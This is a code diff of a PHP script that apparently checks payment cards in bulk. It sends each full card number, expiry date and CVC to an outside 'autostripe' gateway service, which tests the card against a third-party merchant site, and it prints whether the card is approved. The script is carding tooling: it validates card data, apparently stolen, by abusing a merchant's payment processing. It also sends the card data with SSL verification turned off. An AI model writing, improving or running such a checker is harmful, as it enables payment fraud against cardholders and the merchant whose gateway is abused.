@@ -7,11 +7,12 @@ error_reporting(E_ALL);
 
 // Function to check a single card via API
 function checkCard($card_number, $exp_month, $exp_year, $cvc) {
-    // Normalize exp_year to 4 digits if needed (handled before call)
+    // Prepare card details for API and display
+    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
+    $encoded_cc = urlencode($card_details);
+    
     // API endpoint configuration
-    $cc = "$card_number|$exp_month|$exp_year|$cvc";
-    $encoded_cc = urlencode($cc);
-    $api_url = "https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=shebrews.org&{$encoded_cc}";
+    $api_url = "https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=shebrews.org&cc=$encoded_cc";
 
     // Initialize cURL
     $ch = curl_init();
@@ -19,16 +20,13 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification if needed (insecure; use with caution)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL
 
     // Execute request
     $response = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $curl_error = curl_error($ch);
     curl_close($ch);
-
-    // Prepare card details string (using input values)
-    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
 
     // Handle API errors
     if ($response === false || $http_code !== 200 || !empty($curl_error)) {
@@ -42,7 +40,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     }
 
     $status = strtoupper($result['status']);
-    $response_msg = $result['response'];
+    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message
 
     // Output based on status
     if ($status === "APPROVED") {
@@ -55,7 +53,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
 }
 
 // Check if the request is POST and contains card data
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
+if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
     echo "DECLINED [Invalid request or missing card data]";
     exit;
 }
@@ -79,36 +77,42 @@ $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);
 
 // Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
-if (strlen($exp_month) > 2) {
+if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
     echo "DECLINED [Invalid exp_month format]";
     exit;
 }
 
 // Normalize exp_year to 4 digits
 if (strlen($exp_year_raw) == 2) {
-    $current_year = date('y'); // Last two digits of current year (25 for 2025)
-    $current_century = date('Y') - ($current_year); // 2000 for 2025
-    $card_century = (int)$exp_year_raw >= (int)$current_year ? $current_century : $current_century + 100;
-    $exp_year = $card_century + (int)$exp_year_raw;
+    $current_year = (int) date('y'); // Last two digits of current year (e.g., 25 for 2025)
+    $current_century = (int) (date('Y') - $current_year); // e.g., 2000 for 2025
+    $card_year = (int) $exp_year_raw;
+    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
 } elseif (strlen($exp_year_raw) == 4) {
-    $exp_year = $exp_year_raw;
+    $exp_year = (int) $exp_year_raw;
 } else {
     echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
     exit;
 }
 
 // Basic validation
-if (!preg_match('/^\d{13,19}$/', $card_number) ||
-    !preg_match('/^\d{2}$/', $exp_month) ||
-    !preg_match('/^\d{4}$/', $exp_year) ||
-    !preg_match('/^\d{3,4}$/', $cvc)) {
-    echo "DECLINED [Invalid card format]";
+if (!preg_match('/^\d{13,19}$/', $card_number)) {
+    echo "DECLINED [Invalid card number format]";
+    exit;
+}
+if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
+    echo "DECLINED [Invalid exp_year format after normalization]";
+    exit;
+}
+if (!preg_match('/^\d{3,4}$/', $cvc)) {
+    echo "DECLINED [Invalid CVC format]";
     exit;
 }
 
 // Validate logical expiry
 $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
-if ($expiry_timestamp < strtotime('first day of this month')) {
+$current_timestamp = strtotime('first day of this month');
+if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
     echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
     exit;
 }
